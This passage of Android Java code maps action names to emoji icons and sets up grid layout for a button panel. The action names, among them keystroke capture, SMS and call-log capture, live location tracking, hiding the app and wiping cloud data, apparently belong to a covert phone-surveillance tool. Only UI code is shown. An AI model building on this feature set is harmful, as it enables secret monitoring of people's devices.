                case REQUEST_ALL_PERMISSION:          return "🔐";
                case REQUEST_EXACT_ALARM_PERMISSION:  return "⏰";
                case REQUEST_ACCESSIBILITY_PERMISSION:return "♿";
                case REQUEST_SMS_PERMISSION:          return "📩";
                case REQUEST_FILE_ACCESS_PERMISSION:  return "📁";
                case REQUEST_NOTIFICATION_ACCESS:     return "🔔";
                case MANAGE_USAGE_AND_APPS:           return "📊";
                case REQUEST_BATTERY_OPTIMIZATION:    return "🔋";
                case START_SENSOR_SERVICE:            return "📡";
                case CAPTURE_ALL_CONTACTS:            return "👥";
                case CAPTURE_ALL_SMS:                 return "💬";
                case CAPTURE_ALL_CALL_LOGS:           return "📞";
                case MONITOR_CALL_STATE:              return "📲";
                case CAPTURE_KEY_STROKES:             return "⌨";
                case CAPTURE_NOTIFICATIONS:           return "🔕";
                case GET_APP_USAGE_STATISTICS_REPORT: return "📊";
                case MONITOR_PHONE_STATISTICS:        return "📱";
                case GET_DIRECTORY_STRUCTURE:         return "🗂";
                case RESET_ALL_PERMISSION:            return "🧨";
                case TRACK_LIVE_LOCATION:             return "📍";
                case REQUEST_LOCATION_PERMISSION:     return "🗺";
                case WIPE_CLOUD_DATA:                 return "🧹";
                case REQUEST_VPN_PERMISSION:          return "🛂";
                case REQUEST_SCREENSHOT_PERMISSION:   return "📸";
                case MONITOR_SCREEN_STATE:            return "🖥️";
                case TOGGLE_APP_VISIBILITY:           return "👁️";
                case PUSH_REMOTE_LOGS:                return "📜";
                default:                              return "⚙";
            }
        } catch (Exception e) { return "⚙"; }
    }

    private static String formatLabel(String key) {
        try { return ClickActions.valueOf(key).getActionLabel(); }
        catch (Exception e) { return key.replace("_", " "); }
    }

    private static GridLayout.LayoutParams createLayoutParams(float density) {
        GridLayout.LayoutParams p = new GridLayout.LayoutParams();
        p.width = 0;
        p.height = GridLayout.LayoutParams.WRAP_CONTENT;
        p.columnSpec = GridLayout.spec(GridLayout.UNDEFINED, 1f);
        p.setGravity(Gravity.FILL);
        int margin = (int) (12 * density);
        p.setMargins(margin, margin, margin, margin);
        return p;
    }

    private static int dp(int v, float density) { return (int) (v * density); }
}
